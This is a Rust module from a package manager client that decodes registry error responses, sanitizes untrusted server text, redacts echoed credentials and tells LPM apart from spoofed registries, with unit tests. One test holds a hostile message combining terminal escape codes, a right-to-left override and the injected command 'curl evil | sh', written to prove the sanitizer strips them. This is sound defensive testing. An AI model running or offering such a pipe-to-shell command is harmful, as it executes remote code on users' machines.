//! Reading a registry's error answer into what the user is told.
//!
//! Registries put their message in different fields: npm's convention is a
//! JSON `error` string, others use `message`, `detail` (RFC 7807) or
//! `reason`, and object storage answers XML with `<Code>` and `<Message>`.
//! lpm.dev adds a machine-readable `code`, and its older Worker answers put
//! a snake_case code in `error` with the message in `message`.
//! Everything a registry sends is untrusted, so the message is sanitized
//! for one terminal row and bounded before it goes anywhere.

use std::time::SystemTime;

use lpm_common::{
    LpmError, RegistryBodyKind, RegistryHttpError, RegistryKind, sanitize_server_text,
};
use reqwest::header::HeaderMap;

/// The longest registry message shown, in characters.
const MAX_MESSAGE_CHARS: usize = 600;
/// The longest code, request id or notice kept, in characters.
const MAX_TOKEN_CHARS: usize = 120;
/// The most of an error body read; the rest is dropped, not the message.
pub(super) const MAX_ERROR_BODY_BYTES: usize = 64 * 1024;
/// lpm.dev's 401 codes for a kind of token no session refresh changes: an
/// organization token, a token limited to one purpose, a vault CI credential.
/// Its other 401s (missing, expired, revoked) may be a stale session, which
/// `AuthRequired` refreshes.
const LPM_UNAUTHORIZED_BEYOND_REFRESH: [&str; 4] = [
    "ORG_TOKEN_UNAVAILABLE",
    "ORG_TOKEN_CREATOR_UNAUTHORIZED",
    "TOKEN_SCOPE_RESTRICTED",
    "VAULT_CREDENTIAL_INVALID",
];

/// What an error answer's headers say, read before its body is.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(super) struct AnswerFacts {
    pub(super) content_type: Option<String>,
    pub(super) request_id: Option<String>,
    pub(super) notice: Option<String>,
    pub(super) retry_after_secs: Option<u64>,
}

impl AnswerFacts {
    /// What an error answer's `headers` say. `redact` takes the request's
    /// credentials out of the text a server controls, as an echoed bearer in
    /// a notice, before it's cleaned and cut, so no part of one survives.
    pub(super) fn from_headers(headers: &HeaderMap, redact: impl Fn(&mut String)) -> Self {
        let text = |name: &str| {
            headers
                .get(name)
                .and_then(|value| value.to_str().ok())
                .map(str::trim)
                .filter(|value| !value.is_empty())
        };
        let shown = |value: &str, max_chars: usize| {
            let mut value = value.to_owned();
            redact(&mut value);
            sanitize_server_text(&value, max_chars)
        };
        Self {
            content_type: text("content-type").map(|value| value.to_ascii_lowercase()),
            request_id: [
                "x-lpm-request-id",
                "x-request-id",
                "x-lpm-trace-id",
                "cf-ray",
            ]
            .into_iter()
            .find_map(text)
            .map(|id| shown(id, MAX_TOKEN_CHARS)),
            notice: text("npm-notice").map(|notice| shown(notice, 300)),
            retry_after_secs: text("retry-after")
                .and_then(|value| retry_after_secs(value, SystemTime::now())),
        }
    }
}

/// The seconds a `Retry-After` value asks to wait: a number of seconds, or
/// an HTTP date, which is at least one second away once it has passed.
pub(super) fn retry_after_secs(value: &str, now: SystemTime) -> Option<u64> {
    let value = value.trim();
    if let Ok(seconds) = value.parse::<u64>() {
        return Some(seconds);
    }
    let at = httpdate::parse_http_date(value).ok()?;
    Some(
        at.duration_since(now)
            .map_or(1, |wait| wait.as_secs().max(1)),
    )
}

/// The origin a request went to, and which registry that is.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct RegistryOrigin {
    pub(super) origin: String,
    pub(super) kind: RegistryKind,
}

impl RegistryOrigin {
    /// The origin of `url` and its kind, given the LPM registry's base URL
    /// and npm's.
    pub(super) fn of(url: &reqwest::Url, lpm_base_url: &str, npm_registry_url: &str) -> Self {
        let origin = url.origin().ascii_serialization();
        let same_origin = |base: &str| {
            reqwest::Url::parse(base)
                .is_ok_and(|base| base.origin().ascii_serialization() == origin)
        };
        let kind = if same_origin(lpm_base_url) {
            RegistryKind::Lpm
        } else if same_origin(npm_registry_url) || url.host_str() == Some("registry.npmjs.org") {
            RegistryKind::Npm
        } else {
            RegistryKind::Custom
        };
        Self { origin, kind }
    }
}

fn looks_like_code(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 64
        && value
            .bytes()
            .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'_')
        && value.contains('_')
}

fn clean_code(value: &str) -> Option<String> {
    let trimmed = value.trim();
    (!trimmed.is_empty()
        && trimmed.len() <= 64
        && trimmed
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.')))
    .then(|| trimmed.to_owned())
}

fn string_field<'a>(value: &'a serde_json::Value, key: &str) -> Option<&'a str> {
    value
        .get(key)
        .and_then(serde_json::Value::as_str)
        .map(str::trim)
        .filter(|text| !text.is_empty())
}

fn body_kind(facts: &AnswerFacts, body: &str) -> RegistryBodyKind {
    let trimmed = body.trim_start();
    let content_type = facts.content_type.as_deref().unwrap_or_default();
    let media_type = content_type
        .split(';')
        .next()
        .unwrap_or_default()
        .trim_end();
    if trimmed.is_empty() {
        RegistryBodyKind::Empty
    } else if media_type.ends_with("/xml") || media_type.ends_with("+xml") {
        RegistryBodyKind::Xml
    } else if media_type == "text/html" {
        RegistryBodyKind::Html
    } else if trimmed.starts_with("<?xml") || trimmed.starts_with("<Error>") {
        RegistryBodyKind::Xml
    } else if trimmed.starts_with('<') {
        RegistryBodyKind::Html
    } else if trimmed.starts_with('{') || trimmed.starts_with('[') {
        RegistryBodyKind::Json
    } else {
        RegistryBodyKind::Text
    }
}

/// The text of the first `<name>` element in an XML error, unescaped. Object
/// storage errors are flat, so no parser is needed to find it.
fn xml_element(body: &str, name: &str) -> Option<String> {
    let open = format!("<{name}>");
    let start = body.find(&open)? + open.len();
    let end = body[start..].find(&format!("</{name}>"))? + start;
    let text = body[start..end].trim();
    (!text.is_empty()).then(|| {
        text.replace("&lt;", "<")
            .replace("&gt;", ">")
            .replace("&quot;", "\"")
            .replace("&apos;", "'")
            .replace("&amp;", "&")
    })
}

fn status_phrase(status: u16) -> &'static str {
    reqwest::StatusCode::from_u16(status)
        .ok()
        .and_then(|status| status.canonical_reason())
        .unwrap_or("Error")
}

/// What a registry's error answer says.
pub(super) fn decode_registry_error(
    status: u16,
    facts: &AnswerFacts,
    body: &str,
    origin: &RegistryOrigin,
) -> RegistryHttpError {
    let mut kind = body_kind(facts, body);
    let mut code = None;
    let mut message = None;
    let mut request_id = facts.request_id.clone();

    if kind == RegistryBodyKind::Json {
        match serde_json::from_str::<serde_json::Value>(body) {
            Ok(value) => {
                code = string_field(&value, "code").and_then(clean_code);
                let error = string_field(&value, "error");
                // An lpm.dev Worker answer that put its code in `error`.
                let error_is_code = code.is_none()
                    && origin.kind == RegistryKind::Lpm
                    && error.is_some_and(looks_like_code);
                if error_is_code {
                    code = error.and_then(clean_code);
                }
                message = (!error_is_code)
                    .then_some(error)
                    .flatten()
                    .or_else(|| string_field(&value, "message"))
                    .or_else(|| string_field(&value, "detail"))
                    .or_else(|| string_field(&value, "reason"))
                    .or_else(|| string_field(&value, "title"))
                    .map(|text| sanitize_server_text(text, MAX_MESSAGE_CHARS))
                    .filter(|text| !text.is_empty());
                if let Some(id) = string_field(&value, "requestId") {
                    request_id = Some(sanitize_server_text(id, MAX_TOKEN_CHARS));
                }
            }
            Err(_) => kind = RegistryBodyKind::Text,
        }
    }
    if kind == RegistryBodyKind::Xml {
        code = xml_element(body, "Code").and_then(|text| clean_code(&text));
        message = xml_element(body, "Message")
            .map(|text| sanitize_server_text(&text, MAX_MESSAGE_CHARS))
            .filter(|text| !text.is_empty());
        if let Some(id) = xml_element(body, "RequestId") {
            request_id = request_id.or_else(|| Some(sanitize_server_text(&id, MAX_TOKEN_CHARS)));
        }
    }
    if kind == RegistryBodyKind::Text {
        message = body
            .lines()
            .map(str::trim)
            .find(|line| !line.is_empty())
            .map(|line| sanitize_server_text(line, MAX_MESSAGE_CHARS))
            .filter(|text| !text.is_empty());
    }

    let host = origin
        .origin
        .split_once("://")
        .map_or(origin.origin.as_str(), |(_, host)| host);
    let message_from_registry = message.is_some();
    let message = message.unwrap_or_else(|| match kind {
        RegistryBodyKind::Html => format!(
            "{host} answered HTTP {status} {} with an HTML page instead of a registry response, which usually means a proxy, firewall or CDN answered.",
            status_phrase(status)
        ),
        RegistryBodyKind::Xml => match &code {
            Some(code) => format!(
                "{host} answered HTTP {status} {} with the storage error {code}.",
                status_phrase(status)
            ),
            None => format!(
                "{host} answered HTTP {status} {} with an XML error instead of a registry response.",
                status_phrase(status)
            ),
        },
        _ => format!(
            "{host} answered HTTP {status} {} without saying why.",
            status_phrase(status)
        ),
    });

    RegistryHttpError {
        status,
        registry: origin.origin.clone(),
        registry_kind: origin.kind,
        code,
        message,
        message_from_registry,
        body_kind: kind,
        request_id: request_id.filter(|id| !id.is_empty()),
        // Only a rate limit or an unavailable server says when to come back.
        retry_after_secs: facts
            .retry_after_secs
            .filter(|_| matches!(status, 429 | 503)),
        notice: facts.notice.clone(),
        subject: None,
    }
}

/// The error a registry's non-success answer is. A 403 from lpm.dev that
/// names one of its firewall or entitlement codes keeps its typed error;
/// no other registry can produce those, so a third party can't pose as
/// LPM's firewall. A 429 keeps the full wait it asked for.
pub(super) fn registry_refusal(
    status: u16,
    facts: &AnswerFacts,
    body: &str,
    origin: &RegistryOrigin,
) -> LpmError {
    if status == 403
        && origin.kind == RegistryKind::Lpm
        && let Some(error) = super::body::parse_lpm_worker_error_body(body)
    {
        return error;
    }
    let answer = decode_registry_error(status, facts, body, origin);
    // A rate limit the registry explains keeps its explanation, such as a
    // quota and whom to ask; `is_rate_limited` and its `rate_limited` code
    // hold either way.
    if status == 429 && !answer.message_from_registry && answer.code.is_none() {
        return LpmError::RateLimited {
            retry_after_secs: facts.retry_after_secs.unwrap_or(1),
        };
    }
    LpmError::RegistryHttp(Box::new(answer))
}

/// The error a 401 is. From lpm.dev it's `AuthRequired`, which refreshes the
/// session and retries, unless its code names a kind of token no refresh
/// changes; then the registry's reason is what the user needs to read. From
/// another registry it's that registry's refusal.
pub(super) fn unauthorized(facts: &AnswerFacts, body: &str, origin: &RegistryOrigin) -> LpmError {
    if origin.kind != RegistryKind::Lpm {
        return registry_refusal(401, facts, body, origin);
    }
    let answer = decode_registry_error(401, facts, body, origin);
    if answer
        .code
        .as_deref()
        .is_some_and(|code| LPM_UNAUTHORIZED_BEYOND_REFRESH.contains(&code))
    {
        LpmError::RegistryHttp(Box::new(answer))
    } else {
        LpmError::AuthRequired
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;

    fn lpm() -> RegistryOrigin {
        RegistryOrigin {
            origin: "https://lpm.dev".into(),
            kind: RegistryKind::Lpm,
        }
    }

    fn custom() -> RegistryOrigin {
        RegistryOrigin {
            origin: "https://npm.example.com".into(),
            kind: RegistryKind::Custom,
        }
    }

    fn json() -> AnswerFacts {
        AnswerFacts {
            content_type: Some("application/json".into()),
            ..AnswerFacts::default()
        }
    }

    #[test]
    fn reads_the_message_npm_prints_and_the_code_beside_it() {
        let answer = decode_registry_error(
            403,
            &json(),
            r#"{"error":"@lpm.dev/acme.ui needs a license.","code":"LICENSE_REQUIRED"}"#,
            &lpm(),
        );
        assert_eq!(answer.message, "@lpm.dev/acme.ui needs a license.");
        assert_eq!(answer.code.as_deref(), Some("LICENSE_REQUIRED"));
        assert!(answer.message_from_registry);
        assert_eq!(answer.body_kind, RegistryBodyKind::Json);
    }

    #[test]
    fn reads_message_detail_and_reason_from_other_registries() {
        for (body, expected) in [
            (r#"{"message":"m"}"#, "m"),
            (r#"{"detail":"d","title":"t"}"#, "d"),
            (r#"{"reason":"r"}"#, "r"),
            (r#"{"title":"t"}"#, "t"),
        ] {
            assert_eq!(
                decode_registry_error(400, &json(), body, &custom()).message,
                expected
            );
        }
    }

    #[test]
    fn takes_a_legacy_lpm_worker_code_from_error_only_from_lpm() {
        let body =
            r#"{"error":"npm_firewall_auth_required","message":"Sign in to use the firewall."}"#;
        let answer = decode_registry_error(401, &json(), body, &lpm());
        assert_eq!(answer.code.as_deref(), Some("npm_firewall_auth_required"));
        assert_eq!(answer.message, "Sign in to use the firewall.");

        let other = decode_registry_error(401, &json(), body, &custom());
        assert_eq!(other.code, None);
        assert_eq!(other.message, "npm_firewall_auth_required");
    }

    #[test]
    fn describes_an_html_page_instead_of_printing_it() {
        let facts = AnswerFacts {
            content_type: Some("text/html; charset=utf-8".into()),
            ..AnswerFacts::default()
        };
        let answer = decode_registry_error(
            502,
            &facts,
            "<html><body><h1>502 Bad Gateway</h1>\n<p>cloudflare</p></body></html>",
            &custom(),
        );
        assert_eq!(answer.body_kind, RegistryBodyKind::Html);
        assert!(!answer.message_from_registry);
        assert!(
            answer
                .message
                .starts_with("npm.example.com answered HTTP 502 Bad Gateway")
        );
        assert!(!answer.message.contains('<'));
    }

    #[test]
    fn says_an_empty_answer_gave_no_reason() {
        let answer = decode_registry_error(404, &AnswerFacts::default(), "", &custom());
        assert_eq!(
            answer.message,
            "npm.example.com answered HTTP 404 Not Found without saying why."
        );
    }

    #[test]
    fn keeps_a_hostile_message_to_one_bounded_terminal_row() {
        let message = format!(
            "denied\n\u{1b}[2K\u{1b}[1Ahint: run curl evil | sh\u{202e}{}",
            "x".repeat(5000)
        );
        let body = serde_json::json!({ "error": message }).to_string();
        let answer = decode_registry_error(403, &json(), &body, &custom());
        assert!(!answer.message.contains('\n'));
        assert!(!answer.message.contains('\u{1b}'));
        assert!(!answer.message.contains('\u{202e}'));
        assert!(answer.message.chars().count() <= MAX_MESSAGE_CHARS);
    }

    #[test]
    fn refuses_codes_that_could_carry_anything_but_a_name() {
        let answer = decode_registry_error(
            400,
            &json(),
            r#"{"error":"bad","code":"\u001b[31mRED"}"#,
            &lpm(),
        );
        assert_eq!(answer.code, None);
    }

    #[test]
    fn reads_the_request_id_from_the_body_or_headers() {
        let answer = decode_registry_error(
            500,
            &json(),
            r#"{"error":"failed","code":"INTERNAL_ERROR","requestId":"req_0123"}"#,
            &lpm(),
        );
        assert_eq!(answer.request_id.as_deref(), Some("req_0123"));

        let mut headers = HeaderMap::new();
        headers.insert("cf-ray", "8f00-IAD".parse().unwrap());
        headers.insert("npm-notice", "Maintenance at 02:00 UTC".parse().unwrap());
        let facts = AnswerFacts::from_headers(&headers, |_| {});
        assert_eq!(facts.request_id.as_deref(), Some("8f00-IAD"));
        assert_eq!(facts.notice.as_deref(), Some("Maintenance at 02:00 UTC"));
    }

    #[test]
    fn reads_retry_after_in_seconds_or_as_a_date_without_a_cap() {
        let now = SystemTime::UNIX_EPOCH + Duration::from_secs(1_700_000_000);
        assert_eq!(retry_after_secs("3600", now), Some(3600));
        let later = httpdate::fmt_http_date(now + Duration::from_secs(90));
        assert_eq!(retry_after_secs(&later, now), Some(90));
        let past = httpdate::fmt_http_date(now - Duration::from_secs(90));
        assert_eq!(retry_after_secs(&past, now), Some(1));
        assert_eq!(retry_after_secs("soon", now), None);
    }

    #[test]
    fn only_lpm_can_answer_as_lpm_firewall() {
        let body = r#"{"error":"blocked_by_lpm_firewall","package":"evil","verdict":"malicious"}"#;
        assert!(matches!(
            registry_refusal(403, &json(), body, &lpm()),
            LpmError::NpmFirewallBlocked(_)
        ));
        let spoof = registry_refusal(403, &json(), body, &custom());
        assert!(matches!(spoof, LpmError::RegistryHttp(_)));
        assert!(spoof.is_forbidden());
    }

    #[test]
    fn keeps_a_rate_limits_explanation_and_its_wait() {
        let facts = AnswerFacts {
            retry_after_secs: Some(3600),
            ..json()
        };
        let error = registry_refusal(
            429,
            &facts,
            r#"{"error":"Your organization used its monthly download quota. Ask its administrator to raise it.","code":"QUOTA_EXHAUSTED"}"#,
            &custom(),
        );
        assert!(error.is_rate_limited());
        assert_eq!(error.error_code(), "rate_limited");
        let LpmError::RegistryHttp(answer) = error else {
            panic!("{error:?}");
        };
        assert_eq!(answer.code.as_deref(), Some("QUOTA_EXHAUSTED"));
        assert!(answer.message.starts_with("Your organization used"));
        assert_eq!(answer.retry_after_secs, Some(3600));
    }

    #[test]
    fn takes_the_requests_credentials_out_of_header_text() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "npm-notice",
            "rejected token lpm_secret123".parse().unwrap(),
        );
        headers.insert("x-request-id", "lpm_secret123-7f".parse().unwrap());
        let facts = AnswerFacts::from_headers(&headers, |text| {
            *text = text.replace("lpm_secret123", "<redacted>");
        });
        assert_eq!(facts.notice.as_deref(), Some("rejected token <redacted>"));
        assert_eq!(facts.request_id.as_deref(), Some("<redacted>-7f"));
    }

    #[test]
    fn reports_the_full_wait_a_rate_limit_asked_for() {
        let facts = AnswerFacts {
            retry_after_secs: Some(3600),
            ..AnswerFacts::default()
        };
        assert!(matches!(
            registry_refusal(429, &facts, "", &lpm()),
            LpmError::RateLimited {
                retry_after_secs: 3600
            }
        ));
    }

    #[test]
    fn reads_an_object_storage_xml_error_instead_of_calling_it_html() {
        let facts = AnswerFacts {
            content_type: Some("application/xml".into()),
            ..AnswerFacts::default()
        };
        let body = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Error><Code>AccessDenied</Code><Message>Request has expired &amp; can&apos;t be used</Message><RequestId>R2-7f</RequestId></Error>";
        let answer = decode_registry_error(403, &facts, body, &custom());
        assert_eq!(answer.body_kind, RegistryBodyKind::Xml);
        assert_eq!(answer.code.as_deref(), Some("AccessDenied"));
        assert_eq!(answer.message, "Request has expired & can't be used");
        assert_eq!(answer.request_id.as_deref(), Some("R2-7f"));

        let sniffed = decode_registry_error(
            404,
            &AnswerFacts::default(),
            "<Error><Code>NoSuchKey</Code></Error>",
            &custom(),
        );
        assert_eq!(sniffed.body_kind, RegistryBodyKind::Xml);
        assert!(!sniffed.message_from_registry);
        assert_eq!(
            sniffed.message,
            "npm.example.com answered HTTP 404 Not Found with the storage error NoSuchKey."
        );
    }

    #[test]
    fn keeps_a_wait_only_where_a_status_means_come_back_later() {
        let facts = AnswerFacts {
            retry_after_secs: Some(30),
            ..AnswerFacts::default()
        };
        assert_eq!(
            decode_registry_error(503, &facts, "", &lpm()).retry_after_secs,
            Some(30)
        );
        assert_eq!(
            decode_registry_error(403, &facts, "", &lpm()).retry_after_secs,
            None
        );
    }

    #[test]
    fn keeps_lpm_401s_a_refresh_cannot_fix_as_the_registrys_reason() {
        for code in LPM_UNAUTHORIZED_BEYOND_REFRESH {
            let body = serde_json::json!({
                "error": "Whoever created this organization token no longer has the role it needs.",
                "code": code,
            })
            .to_string();
            let error = unauthorized(&json(), &body, &lpm());
            assert!(
                matches!(&error, LpmError::RegistryHttp(answer) if answer.status == 401 && answer.code.as_deref() == Some(code)),
                "{code}: {error:?}"
            );
            assert!(error.is_lpm_credential_failure());
            let LpmError::RegistryHttp(answer) = error else {
                unreachable!()
            };
            assert_eq!(
                answer.hint(),
                None,
                "the registry's message carries the advice"
            );
        }
        for body in [
            r#"{"error":"The lpm.dev token sent has expired.","code":"TOKEN_EXPIRED"}"#,
            r#"{"error":"needs a token","code":"AUTH_REQUIRED"}"#,
            "",
            "<html>401</html>",
        ] {
            assert!(
                matches!(unauthorized(&json(), body, &lpm()), LpmError::AuthRequired),
                "{body}"
            );
        }
        assert!(matches!(
            unauthorized(&json(), r#"{"error":"bad token","code":"ORG_TOKEN_UNAVAILABLE"}"#, &custom()),
            LpmError::RegistryHttp(answer) if answer.registry_kind == RegistryKind::Custom
        ));
    }

    #[test]
    fn classifies_the_registry_a_request_went_to() {
        let url = |text: &str| reqwest::Url::parse(text).unwrap();
        let of =
            |text| RegistryOrigin::of(&url(text), "https://lpm.dev", "https://registry.npmjs.org");
        assert_eq!(of("https://lpm.dev/api/registry/x").kind, RegistryKind::Lpm);
        assert_eq!(
            of("https://registry.npmjs.org/react").kind,
            RegistryKind::Npm
        );
        assert_eq!(
            of("https://npm.pkg.github.com/x").kind,
            RegistryKind::Custom
        );
        assert_eq!(of("https://lpm.dev.evil.com/x").kind, RegistryKind::Custom);
        assert_eq!(
            of("https://user:secret@npm.example.com/x").origin,
            "https://npm.example.com"
        );
    }
}
